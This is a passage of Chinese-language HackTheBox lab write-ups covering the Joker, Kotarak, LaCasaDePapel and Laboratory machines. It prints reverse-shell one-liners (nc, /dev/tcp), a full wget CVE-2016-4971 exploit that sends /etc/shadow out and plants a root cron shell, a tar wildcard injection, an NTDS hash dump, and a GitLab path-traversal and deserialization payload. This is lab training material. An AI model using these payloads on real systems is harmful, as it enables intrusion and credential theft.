<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zcf &#x2F;home&#x2F;alekos&#x2F;backup&#x2F;&#96;date&#96;.tar.gz &#x2F;home&#x2F;alekos&#x2F;development&#x2F;*</span><br></pre></td></tr></table></figure>

<p>利用tar，我们进行通配符注入，利用文件名作为参数，来执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;rm &#x2F;tmp&#x2F;ff;mkfifo &#x2F;tmp&#x2F;ff;cat &#x2F;tmp&#x2F;ff|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc -u 10.10.16.98 4444 &gt;&#x2F;tmp&#x2F;ff&quot; &gt; shell.sh &amp;&amp;chmod +x shell.sh</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action&#x3D;exec&#x3D;sh shell.sh&quot;</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="/images/Joker/23.png" alt="23"></p>
<p>等5分钟</p>
<p><img src="/images/Joker/24.png" alt="24"></p>
<p>最后找到了backup.sh，和猜想差不多</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">FILENAME&#x3D;&quot;dev-$(date +%s).tar.gz&quot;</span><br><span class="line"></span><br><span class="line">cd &#x2F;home&#x2F;alekos&#x2F;development;</span><br><span class="line">tar cf &#x2F;home&#x2F;alekos&#x2F;backup&#x2F;$FILENAME *;</span><br><span class="line">chown root:alekos &#x2F;home&#x2F;alekos&#x2F;backup&#x2F;$FILENAME;</span><br><span class="line">chmod 640 &#x2F;home&#x2F;alekos&#x2F;backup&#x2F;$FILENAME;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Kotarak</title>
    <url>/2020/06/23/HTB-Kotarak/</url>
    <content><![CDATA[<h1 id="Kotarak"><a href="#Kotarak" class="headerlink" title="Kotarak"></a>Kotarak</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Kotarak/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>先访问目标的8080端口，可以发现目标正在运行这tomcat<br>先不进行暴力破解，防止被锁，去查看60000这个特殊端口</p>
<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>该页面提示我们它提供了一个匿名访问的接口，这种接口通常伴随SSRF漏洞<br>我们尝试让其访问kali的80端口，发现确实存在访问请求</p>
<p><img src="/images/Kotarak/2.jpg" alt="2"></p>
<p>通过这点我们可以尝试:内网端口扫描、任意文件读取、服务版本获取、数据库未授权访问等</p>
<p>尝试进行文件读取：失败</p>
<p><img src="/images/Kotarak/3.jpg" alt="3"></p>
<p>尝试内网扫描<br>先尝试已确认的开放端口，发现如果端口开放，会直接回显页面内容</p>
<p><img src="/images/Kotarak/4.jpg" alt="4"></p>
<p>使用wfuzz进行端口扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c -z range,1-65535  http:&#x2F;&#x2F;10.10.10.55:60000&#x2F;url.php?path&#x3D;http:&#x2F;&#x2F;127.0.0.1:FUZZ</span><br></pre></td></tr></table></figure>

<p>进一步过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c -z range,1-65535 --hl&#x3D;2 http:&#x2F;&#x2F;10.10.10.55:60000&#x2F;url.php?path&#x3D;http:&#x2F;&#x2F;127.0.0.1:FUZZ</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kotarak/5.jpg" alt="5"></p>
<p>我们已经发现了内网存在的端口了，尝试逐个访问<br>在888端口有了发现</p>
<p><img src="/images/Kotarak/6.jpg" alt="6"></p>
<p>直接访问是不行的，我们可以通过ssrf配合相对路径进行访问</p>
<p><img src="/images/Kotarak/7.jpg" alt="7"></p>
<p>访问时由于存在两个query string，还需要对路径进行url编码</p>
<p><img src="/images/Kotarak/8.jpg" alt="8"></p>
<p>最终查看到了tomcat的密码</p>
<p>或者之前的输入框里输入url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:888&#x2F;?doc&#x3D;backup</span><br></pre></td></tr></table></figure>

<p>之后到一个空白页面</p>
<p><img src="/images/Kotarak/10.jpg" alt="10"></p>
<p>查看网页源代码即可</p>
<p><img src="/images/Kotarak/11.jpg" alt="11"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="tomcat上传getshell"><a href="#tomcat上传getshell" class="headerlink" title="tomcat上传getshell"></a>tomcat上传getshell</h3><p>登录tomcat，账号密码<code>admin/3@g01PdhB!</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.10.16.99 LPORT&#x3D;4444 -f war -o evil.war</span><br></pre></td></tr></table></figure>

<p>成功上传，getshell</p>
<p><img src="/images/Kotarak/13.jpg" alt="13"></p>
<p>升级为交互式shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">Ctrl+Z</span><br><span class="line">stty raw -echo</span><br><span class="line">fg</span><br><span class="line">reset</span><br><span class="line">xterm-color</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Kotarak/14.jpg" alt="14"></p>
<p>在home目录下发现了有域文件.dit和.bin，全部传输到kali</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 5555 &gt; a.bin</span><br><span class="line">nc 10.10.16.99 5555 &lt; 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin </span><br><span class="line">nc -lvp 5555 &gt; a.dit</span><br><span class="line">nc 10.10.16.99 5555 &lt; 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit</span><br></pre></td></tr></table></figure>

<p>解开域数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -system a.bin -ntds a.dit LOCAL</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kotarak/15.jpg" alt="15"></p>
<p>尝试破解hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::</span><br><span class="line">atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::</span><br></pre></td></tr></table></figure>

<p>hashcat</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat64.exe -m 1000 -a 0 test.txt rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kotarak/16.jpg" alt="16"></p>
<p><code>Administrator/f16tomcat!</code><br><code>atanas/Password123!</code></p>
<p>这里有坑，切换用户的时候，账号密码换了组合<code>atanas/f16tomcat!</code></p>
<p>切换后再扫一下</p>
<p><img src="/images/Kotarak/17.jpg" alt="17"></p>
<p>在root目录发现了日志</p>
<p><img src="/images/Kotarak/18.jpg" alt="18"></p>
<p>并且很神奇，我们可以读root目录下的flag.txt，不过里面并没有flag</p>
<p><img src="/images/Kotarak/22.jpg" alt="22"></p>
<p>还是要更进一步，通过log我们可以发现，10.10.3.133这台机器一直在向我们拿下user权限的机器10.10.10.55发送wget请求<br>而且我们可以基本可以判断10.10.3.133是一台虚拟化设备(网卡lxcbr0)，看样子对方的wget请求是一个cronjobs</p>
<p><img src="/images/Kotarak/23.jpg" alt="23"></p>
<p>通过搜索公开漏洞，发现CVE-2016-4971</p>
<p><img src="/images/Kotarak/19.jpg" alt="19"></p>
<p>其利用原理是A发送wget请求B机器上的资源，我们控制B让其返回302重定向，重定向到我们的kali机器ftp服务的恶意文件，此时wget请求会信任这个302请求，不会验证文件，从而下载kali机器ftp服务上的恶意文件，导致RCE</p>
<p>现在我们需要完成这个exp的过程</p>
<p>首先在kali上，开启ftp服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;tmp&#x2F;ftptest</span><br><span class="line">cd &#x2F;tmp&#x2F;ftptest</span><br><span class="line">cat &lt;&lt;_EOF_&gt;.wgetrc</span><br><span class="line">post_file &#x3D; &#x2F;etc&#x2F;shadow</span><br><span class="line">output_document &#x3D; &#x2F;etc&#x2F;cron.d&#x2F;wget-root-shell</span><br><span class="line">_EOF_</span><br><span class="line">pip install pyftpdlib</span><br><span class="line">cat .wgetrc</span><br><span class="line">python -m pyftpdlib -p21</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kotarak/24.jpg" alt="24"></p>
<p>修改40064.txt中py代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;本地监听端口</span><br><span class="line">HTTP_LISTEN_IP &#x3D; &#39;0.0.0.0&#39;</span><br><span class="line">HTTP_LISTEN_PORT &#x3D; 80</span><br><span class="line">&#x2F;&#x2F;302重定向端口</span><br><span class="line">FTP_HOST &#x3D; &#39;10.10.16.99&#39;</span><br><span class="line">FTP_PORT &#x3D; 21</span><br><span class="line">&#x2F;&#x2F;payload为reverse_shell</span><br><span class="line">ROOT_CRON &#x3D; &quot;* * * * * root rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.99 4444 &gt;&#x2F;tmp&#x2F;f \n&quot;</span><br></pre></td></tr></table></figure>

<p>完整如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> SimpleHTTPServer</span><br><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"><span class="keyword">import</span> socket;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wgetExploit</span>(<span class="params">SimpleHTTPServer.SimpleHTTPRequestHandler</span>):</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="comment"># This takes care of sending .wgetrc</span></span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;We have a volunteer requesting &quot;</span> + self.path + <span class="string">&quot; by GET :)\n&quot;</span></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&quot;Wget&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.headers.getheader(<span class="string">&#x27;User-Agent&#x27;</span>):</span><br><span class="line">          <span class="built_in">print</span> <span class="string">&quot;But it&#x27;s not a Wget :( \n&quot;</span></span><br><span class="line">          self.send_response(<span class="number">200</span>)</span><br><span class="line">          self.end_headers()</span><br><span class="line">          self.wfile.write(<span class="string">&quot;Nothing to see here...&quot;</span>)</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Uploading .wgetrc via ftp redirect vuln. It should land in /root \n&quot;</span></span><br><span class="line">       self.send_response(<span class="number">301</span>)</span><br><span class="line">       new_path = <span class="string">&#x27;%s&#x27;</span>%(<span class="string">&#x27;ftp://anonymous@%s:%s/.wgetrc&#x27;</span>%(FTP_HOST, FTP_PORT) )</span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Sending redirect to %s \n&quot;</span>%(new_path)</span><br><span class="line">       self.send_header(<span class="string">&#x27;Location&#x27;</span>, new_path)</span><br><span class="line">       self.end_headers()</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">do_POST</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="comment"># In here we will receive extracted file and install a PoC cronjob</span></span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;We have a volunteer requesting &quot;</span> + self.path + <span class="string">&quot; by POST :)\n&quot;</span></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&quot;Wget&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.headers.getheader(<span class="string">&#x27;User-Agent&#x27;</span>):</span><br><span class="line">          <span class="built_in">print</span> <span class="string">&quot;But it&#x27;s not a Wget :( \n&quot;</span></span><br><span class="line">          self.send_response(<span class="number">200</span>)</span><br><span class="line">          self.end_headers()</span><br><span class="line">          self.wfile.write(<span class="string">&quot;Nothing to see here...&quot;</span>)</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">       content_len = <span class="built_in">int</span>(self.headers.getheader(<span class="string">&#x27;content-length&#x27;</span>, <span class="number">0</span>))</span><br><span class="line">       post_body = self.rfile.read(content_len)</span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n&quot;</span> % (post_body)</span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Sending back a cronjob script as a thank-you for the file...&quot;</span> </span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;It should get saved in /etc/cron.d/wget-root-shell on the victim&#x27;s host (because of .wgetrc we injected in the GET first response)&quot;</span></span><br><span class="line">       self.send_response(<span class="number">200</span>)</span><br><span class="line">       self.send_header(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">       self.end_headers()</span><br><span class="line">       self.wfile.write(ROOT_CRON)</span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;\nFile was served. Check on /root/hacked-via-wget on the victim&#x27;s host in a minute! :) \n&quot;</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">HTTP_LISTEN_IP = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">HTTP_LISTEN_PORT = <span class="number">80</span></span><br><span class="line">FTP_HOST = <span class="string">&#x27;10.10.16.99&#x27;</span></span><br><span class="line">FTP_PORT = <span class="number">21</span></span><br><span class="line"></span><br><span class="line">ROOT_CRON = <span class="string">&quot;* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.99 4444 &gt;/tmp/f \n&quot;</span></span><br><span class="line"></span><br><span class="line">handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Ready? Is your FTP server running?&quot;</span></span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">result = sock.connect_ex((FTP_HOST, FTP_PORT))</span><br><span class="line"><span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;FTP found open on %s:%s. Let&#x27;s go then\n&quot;</span> % (FTP_HOST, FTP_PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;FTP is down :( Exiting.&quot;</span></span><br><span class="line">   exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Serving wget exploit on port %s...\n\n&quot;</span> % HTTP_LISTEN_PORT</span><br><span class="line"></span><br><span class="line">handler.serve_forever()</span><br></pre></td></tr></table></figure>

<p>传输到user权限的机器上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444 &gt; exp.py</span><br><span class="line">nc 10.10.10.55 4444 &lt; exp.py</span><br></pre></td></tr></table></figure>

<p>之后运行脚本即可，由于我们需要使用非root用户监听1024以下端口(这里为80)，所以需要使用authbind，恰好这台机器上也有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">authbind python exp.py</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kotarak/20.jpg" alt="20"></p>
<p>我们看到.wgetrc被下载，等待2分钟，成功获取root</p>
<p><img src="/images/Kotarak/21.jpg" alt="21"></p>
<p>PATH没设置环境变量/sbin，通过/sbin/ifconfig看到ip为10.0.3.133，至此我们成功获取另一台机器的root</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:LaCasaDePapel</title>
    <url>/2020/06/29/HTB-LaCasaDePapel/</url>
    <content><![CDATA[<h1 id="LaCasaDePapel"><a href="#LaCasaDePapel" class="headerlink" title="LaCasaDePapel"></a>LaCasaDePapel</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/LaCasaDePapel/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>先从21端口，vsftpd开始干<br>因为这个程序也许会存在后门，之前利用过，漏洞细节<a href="https://subscription.packtpub.com/book/networking_and_servers/9781786463166/1/ch01lvl1sec18/vulnerability-analysis-of-vsftpd-2-3-4-backdoor">链接</a></p>
<p>尝试msf，无法获得shell<br>查看原因</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show advanced options</span><br><span class="line">set VERBOSE true</span><br></pre></td></tr></table></figure>

<p><img src="/images/LaCasaDePapel/2.jpg" alt="2"></p>
<p>6200端口不是一个shell，手动复现漏洞看看，这个漏洞很容易复现</p>
<p>连接21，发送用户名<code>:)</code>密码任意</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 10.10.10.131 21</span><br><span class="line">USER :)</span><br><span class="line">PASS any</span><br></pre></td></tr></table></figure>

<p>之后连接21端口，理论上就会有shell</p>
<p><img src="/images/LaCasaDePapel/3.jpg" alt="3"></p>
<p>不过这次好像是个psy shell</p>
<p>测试后发现，以先常见的执行系统吗命令的函数都无法使用，<code>echo</code>这样的命令还是可以执行的<br>我们使用phpinfo()函数，看能否执行</p>
<p><img src="/images/LaCasaDePapel/4.jpg" alt="4"></p>
<p>执行成功，看到了很多被禁用的函数<br>但我们可以使用scandir()显示目录、file_get_contents()读取文件来造成信息泄露</p>
<p><img src="/images/LaCasaDePapel/5.jpg" alt="5"></p>
<p>终于发现了有价值的信息，一个私钥</p>
<p>访问目标443，提示证书错误</p>
<p><img src="/images/LaCasaDePapel/6.jpg" alt="6"></p>
<p>导出它的公钥</p>
<p><img src="/images/LaCasaDePapel/7.jpg" alt="7"></p>
<p>比较根据私钥生成的公钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl pkey -in ca.key -pubout</span><br><span class="line">openssl x509 -in ca.crt -pubkey -noout</span><br></pre></td></tr></table></figure>

<p><img src="/images/LaCasaDePapel/8.jpg" alt="8"></p>
<p>确认一致</p>
<p>搞定证书签名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out client.key 4096</span><br><span class="line">openssl req -new -key client.key -out client.csr</span><br><span class="line">openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -set_serial 200 -extensions client -days 365 -outform PEM -out client.cer</span><br><span class="line">openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12</span><br></pre></td></tr></table></figure>

<p><img src="/images/LaCasaDePapel/9.jpg" alt="9"></p>
<p>添加信任</p>
<p><img src="/images/LaCasaDePapel/10.jpg" alt="10"></p>
<p>重新访问</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p><img src="/images/LaCasaDePapel/11.jpg" alt="11"></p>
<p>之后页面发生了变化<br>随便点点，发现了url参数path=<br>尝试文件包含漏洞</p>
<p><img src="/images/LaCasaDePapel/12.jpg" alt="12"></p>
<p>确认是存在漏洞</p>
<p>点击<code>.ssh</code>发现了私钥</p>
<p><img src="/images/LaCasaDePapel/15.jpg" alt="15"></p>
<p>而且发现，原来页面的avi点击后可进行下载操作，而且file/后的路径经过base64编码</p>
<p><img src="/images/LaCasaDePapel/13.jpg" alt="13"></p>
<p><img src="/images/LaCasaDePapel/14.jpg" alt="14"></p>
<p>看来它的下载请求是<code>file/base64(下载路径)</code><br>所以我们想下载私钥需要构造以下url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#echo -n ..&#x2F;.ssh&#x2F;id_rsa |base64</span><br><span class="line">Li4vLnNzaC9pZF9yc2E&#x3D;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;10.10.10.131&#x2F;file&#x2F;Li4vLnNzaC9pZF9yc2E&#x3D;</span><br></pre></td></tr></table></figure>

<p>这个地方好像有防御机制，如果输错了，443端口就给关了</p>
<p><img src="/images/LaCasaDePapel/16.jpg" alt="16"></p>
<p>成功登录shell</p>
<h3 id="另一个思路"><a href="#另一个思路" class="headerlink" title="另一个思路"></a>另一个思路</h3><p>利用6200的psyshell，可以发现，用户berlin的.ssh目录无法访问，但是dali的.ssh可以访问</p>
<p><img src="/images/LaCasaDePapel/17.jpg" alt="17"></p>
<p>我们可以自己生成ssh密钥对</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -f dali</span><br><span class="line">cat dali.pub</span><br></pre></td></tr></table></figure>

<p>利用php函数<code>file_put_contents</code>对它的<code>authorized_keys</code>追加一个我们的公钥</p>
<p><img src="/images/LaCasaDePapel/18.jpg" alt="18"></p>
<p>这样我们就可以利用生成的私钥进行登录</p>
<p><img src="/images/LaCasaDePapel/19.jpg" alt="19"></p>
<p>可惜仍然是一个psyshell<br>不过既然ssh成功登录，就可以使用隧道进行内网攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -D 8001 -i dali dali@10.10.10.131</span><br></pre></td></tr></table></figure>

<p>配置proxychains的socks5 80001</p>
<p>使用nmap进行扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sT -Pn -n -p- 127.0.0.1</span><br></pre></td></tr></table></figure>

<p><img src="/images/LaCasaDePapel/20.jpg" alt="20"></p>
<p>扫描发现内网8000端口处于开启</p>
<p>浏览器挂上socks代理到127.0.0.1的8001端口</p>
<p>之后访问127.0.0.1:8000</p>
<p><img src="/images/LaCasaDePapel/21.jpg" alt="21"></p>
<p>我们成功发现了这个存在任意文件下载的漏洞地址</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>该方法来源于官方write up</p>
<p><img src="/images/LaCasaDePapel/22.jpg" alt="22"></p>
<p>在主目录下发现创建者为root的ini文件<br>我们可以看到这个文件的行为</p>
<p><img src="/images/LaCasaDePapel/23.jpg" alt="23"></p>
<p>在进程里可以发现UID65534的用户nobody在调用这个文件</p>
<p><img src="/images/LaCasaDePapel/24.jpg" alt="24"></p>
<p>不过我们并不能在进程里看到那个.ini文件的执行，这有点奇怪，也是难点</p>
<p>通过文件行为，我们可以确认那个ini是由root来执行的，我们没有修改权限，但我们可以重新创建一个文件</p>
<p><img src="/images/LaCasaDePapel/25.jpg" alt="25"></p>
<p>成功获取root</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Laboratory</title>
    <url>/2021/02/09/HTB-Laboratory/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Laboratory/1.png" alt="1"></p>
<p>证书里发现了主机名，一起添加hosts里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.216	laboratory.htb git.laboratory.htb</span><br></pre></td></tr></table></figure>

<p><img src="/images/Laboratory/3.png" alt="3"></p>
<p>进行了比较细致的web目录枚举，只发现了一个额外的txt，应该是个图床</p>
<p><img src="/images/Laboratory/2.png" alt="2"></p>
<p>转向另一个主机地址</p>
<p><img src="/images/Laboratory/4.png" alt="4"></p>
<p>发现了gitlab，注册个用户进行信息收集</p>
<p><img src="/images/Laboratory/5.png" alt="5"></p>
<p>注意邮箱使用它的域名</p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>登入gitlab后，首先在帮助页面得到gitlab的版本号</p>
<p><img src="/images/Laboratory/6.png" alt="6"></p>
<h2 id="CVE-2020-10977"><a href="#CVE-2020-10977" class="headerlink" title="CVE-2020-10977"></a>CVE-2020-10977</h2><p>谷歌搜索，可以发现一个CVE:<a href="https://hackerone.com/reports/827052">链接</a></p>
<p>利用过程比较简单，首先创建两个项目</p>
<p><img src="/images/Laboratory/7.png" alt="7"></p>
<p>向项目提交issue，POC的格式需要注意</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![a](&#x2F;uploads&#x2F;11111111111111111111111111111111&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd)</span><br></pre></td></tr></table></figure>

<p><img src="/images/Laboratory/8.png" alt="8"></p>
<p>之后再讲项目1的issue移交给项目2</p>
<p><img src="/images/Laboratory/9.png" alt="9"></p>
<p>之后再在项目2里查看issue，就可以进行文件读取了</p>
<p><img src="/images/Laboratory/10.png" alt="10"></p>
<p>继续阅读文章，后半部分描述了如何读取<code>secret_key_base</code>来进行cookie反序列化攻击来完成RCE的利用</p>
<p>为了方便读取文件，找到了自动化利用脚本，<a href="https://github.com/thewhiteh4t/cve-2020-10977">链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 cve_2020_10977.py https:&#x2F;&#x2F;git.laboratory.htb evilarsene p@ssw0rd123</span><br><span class="line">&#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;config&#x2F;secrets.yml</span><br></pre></td></tr></table></figure>

<p>主要关注<code>secret_key_base</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3</span><br></pre></td></tr></table></figure>

<p><img src="/images/Laboratory/11.png" alt="11"></p>
<p>HackerOne上的文章给出了Payload，这里我们需要搭建自己的GitLab来生成序列化Payload，这里使用docker进行安装</p>
<p>在dockerhub上找到对应的版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull gitlab&#x2F;gitlab-ce:12.8.10-ce.0</span><br></pre></td></tr></table></figure>

<p><img src="/images/Laboratory/12.png" alt="12"></p>
<p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run gitlab&#x2F;gitlab-ce:12.8.10-ce.0</span><br></pre></td></tr></table></figure>

<p>安装完成后进入bash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it 552b589611c1 bash</span><br></pre></td></tr></table></figure>

<p>修改容器<code>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code>的<code>secret_key_base</code>为目标上的值</p>
<p><img src="/images/Laboratory/13.png" alt="13"></p>
<p>之后重启</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gitlab-ctl restart</span><br></pre></td></tr></table></figure>

<p>重启完后进入gitlab的控制台</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gitlab-rails console</span><br></pre></td></tr></table></figure>

<p>生成序列化的payload</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">request = ActionDispatch::Request.new(Rails.application.env_config)</span><br><span class="line">request.env[<span class="string">&quot;action_dispatch.cookies_serializer&quot;</span>] = <span class="symbol">:marshal</span></span><br><span class="line">cookies = request.cookie_jar</span><br><span class="line"></span><br><span class="line">erb = ERB.new(<span class="string">&quot;&lt;%= `bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.23/4444 0&gt;&amp;1&#x27;` %&gt;&quot;</span>)</span><br><span class="line">depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, <span class="symbol">:result</span>, <span class="string">&quot;@result&quot;</span>, ActiveSupport::Deprecation.new)</span><br><span class="line">cookies.signed[<span class="symbol">:cookie</span>] = depr</span><br><span class="line">puts cookies[<span class="symbol">:cookie</span>]	</span><br></pre></td></tr></table></figure>

<p>得到</p>
<p><img src="/images/Laboratory/14.png" alt="14"></p>
